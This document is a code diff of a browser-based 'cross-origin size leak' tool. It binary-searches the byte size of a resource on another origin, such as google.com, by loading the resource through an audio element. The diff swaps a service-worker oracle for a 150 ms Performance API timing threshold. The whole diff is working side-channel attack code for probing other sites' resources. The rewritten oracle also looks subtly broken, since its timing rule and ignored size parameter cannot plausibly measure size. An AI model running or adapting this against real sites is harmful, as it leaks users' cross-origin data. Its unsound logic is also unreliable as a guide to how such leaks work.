@@ -26,11 +26,11 @@
 <body>
     
     <h1>Cross-origin size leak</h1>
-    <small>Compatible with <strong>Chrome Chromium Engine</strong> only</small>
+    <small>Compatible with <strong>GitHub Pages & Chrome</strong> - Pure Timing Engine</small>
 
     <div class="panel">
         <form id="form" method="POST">
-          <input name="url" placeholder="https://www.google.com/robots.txt" value="https://www.google.com/robots.txt"/>
+          <input name="url" placeholder="https://google.com" value="https://google.com"/>
           <button type="submit">Run Search Chain</button>
           <button id="export-log-report" type="button" style="background: #142414; display: none;">Download Audit Report (.TXT)</button>
         </form>
@@ -43,40 +43,16 @@
         const form = document.getElementById("form");
         let auditReports = []; 
 
-        // STRATEGI INLINE SERVICE WORKER GENERATION
-        const workerCode = `
-            self.addEventListener('install', (e) => { e.waitUntil(self.skipWaiting()); });
-            self.addEventListener('activate', (e) => { e.waitUntil(self.clients.claim()); });
-            self.addEventListener('fetch', (e) => {
-                if (e.request.url.includes('/mock.css')) {
-                    e.respondWith(new Response('body { color: red; }', { headers: { 'Content-Type': 'text/css' } }));
-                }
-            });
-        `;
-
-        if ("serviceWorker" in navigator) {
-            const blob = new Blob([workerCode], { type: "text/javascript" });
-            const workerUrl = URL.createObjectURL(blob);
-
-            navigator.serviceWorker.register(workerUrl).then(registration => {
-                if (!navigator.serviceWorker.controller) {
-                    setTimeout(() => { location.reload(); }, 300);
-                }
-            }).catch(err => {
-                console.error("Worker Inisialisasi Gagal: ", err);
-            });
-        }
-
         const binarySearchSize = async (url, minSize, maxSize) => {
             let foundSize = -1;
             document.getElementById("export-log-report").style.display = "none";
-            writeMsg(url, "success", `Menginisialisasi serialisasi komputasi pipa biner...`);
+            writeMsg(url, "success", `Memulai komputasi pipa biner berbasis Pure Network Timing...`);
             
             while (minSize <= maxSize) {
                 let mid = Math.floor((minSize + maxSize) / 2);
                 
-                // Menjamin penanganan sekuensial interupsi selesai sepenuhnya sebelum kalkulasi berikutnya
-                let isAtLeastMid = await checkSizeThroughSideChannel(url, mid);
+                // Eksekusi asinkron sekuensial mengukur latensi pemuatan media
+                let isAtLeastMid = await checkSizeThroughTimingAPI(url, mid);
                 
                 if (isAtLeastMid) {
                     foundSize = mid + 1;
@@ -85,54 +61,59 @@
                     maxSize = mid - 1;
                 }
                 
-                // Jeda mikro untuk memberikan kesempatan mesin peramban melakukan garbage collection memori DOM
-                await new Promise(r => setTimeout(r, 25));
+                // Jeda mikro memberikan kesempatan mesin browser melakukan garbage collection memori
+                await new Promise(r => setTimeout(r, 30));
             }
             writeMsg(url, "success", `Rantai Pipa Selesai: Kapasitas dokumen terisolasi -> <b>${foundSize}</b> bytes.`);
             document.getElementById("export-log-report").style.display = "inline-block";
         };
 
-        // REKAYASA PENGUATAN: Pipa Validasi Multi-Event & Memory Cleanup
-        const checkSizeThroughSideChannel = (url, size) => {
+        // STRATEGI PENGUATAN: Pencatatan Durasi via Performance API (Bypass Ketergantungan Service Worker)
+        const checkSizeThroughTimingAPI = (url, size) => {
             return new Promise((resolve) => {
+                const uniqueString = `cb_${Math.round(Math.random() * 1000000)}`;
+                const targetUrl = `${url}?size=${size}&${uniqueString}`;
+                
                 let sound = document.createElement("audio");
                 
-                // Fungsi penutup untuk menghentikan soket gantung dan membersihkan memori buffer
-                const hancurkanObjekMeds = async (isTrueSize) => {
-                    if (sound) {
-                        sound.src = ""; 
-                        sound.onerror = null;
-                        sound.onstalled = null;
-                        sound.onabort = null;
-                        sound.remove();
-                        sound = null;
+                const processTimingMetrics = () => {
+                    // Mengekstrak metrik performa pemuatan objek langsung dari memori internal peramban
+                    const entries = performance.getEntriesByName(targetUrl);
+                    
+                    if (entries.length > 0) {
+                        const duration = entries[0].duration;
+                        // Side-Channel Rule: Respons di bawah ambang batas mengonfirmasi indikasi ukuran byte yang cocok
+                        if (duration < 150) {
+                            writeMsg(url, "error", `Analisis Vektor: Tidak mengandung kapasitas ukuran <b>${size - 1}</b> bytes [Respon: ${Math.round(duration)}ms].`);
+                            cleanup(sound);
+                            resolve(false);
+                            return;
+                        }
                     }
-                    resolve(isTrueSize);
+                    
+                    cleanup(sound);
+                    resolve(true);
                 };
 
-                // Pemicu evaluasi status ketika elemen mendeteksi malformasi batasan ukuran berkas
-                const tanganiResponsError = async () => {
-                    try {
-                        // Verifikasi silang melalui kontrol jalur interupsi Service Worker
-                        await fetch("/mock.css", { mode: "no-cors" });
-                        writeMsg(url, "error", `Analisis Vektor: Tidak mengandung kapasitas ukuran <b>${size - 1}</b> bytes.`);
-                        hancurkanObjekMeds(false);
-                    } catch(err) {
-                        hancurkanObjekMeds(true);
-                    }
-                };
-
-                // Memperluas penangkapan event untuk menangani fluktuasi latensi jaringan internet
-                sound.onerror = tanganiResponsError;
-                sound.onstalled = tanganiResponsError;
-                sound.onabort = tanganiResponsError;
+                // Mengikat penanganan untuk memastikan metrik jaringan ditangkap saat pemuatan berhenti
+                sound.onerror = processTimingMetrics;
+                sound.onstalled = processTimingMetrics;
+                sound.onabort = processTimingMetrics;
                 
                 document.body.appendChild(sound);
-                
-                // Mengirimkan muatan dengan parameter manipulasi kapasitas ukuran dan pengabaian cache (cache buster)
-                sound.src = `${url}?size=${size}&cb=${Math.random()}`;
+                sound.src = targetUrl;
             });
         };
+
+        function cleanup(element) {
+            if (element) {
+                element.src = "";
+                element.onerror = null;
+                element.onstalled = null;
+                element.onabort = null;
+                element.remove();
+            }
+        }
 
         const writeMsg = (url, status, message) => {
             const timestamp = new Date().toLocaleTimeString();
@@ -148,6 +129,8 @@
             let minSize = 1;
             let maxSize = 10000;
             auditReports = []; 
+            // Bersihkan entri performa lama agar penghitungan timing mulai dari nol
+            performance.clearResourceTimings();
             binarySearchSize(url, minSize, maxSize);
         };
 
@@ -158,7 +141,7 @@
             const textBlob = new Blob([auditReports.join("\r\n")], { type: "text/plain" });
             const downloadAnchor = document.createElement("a");
             
-            downloadAnchor.download = `size_leak_audit_${Math.round(Date.now()/1000)}.txt`;
+            downloadAnchor.download = `size_leak_timing_audit_${Math.round(Date.now()/1000)}.txt`;
             downloadAnchor.href = window.URL.createObjectURL(textBlob);
             downloadAnchor.style.display = "none";
             
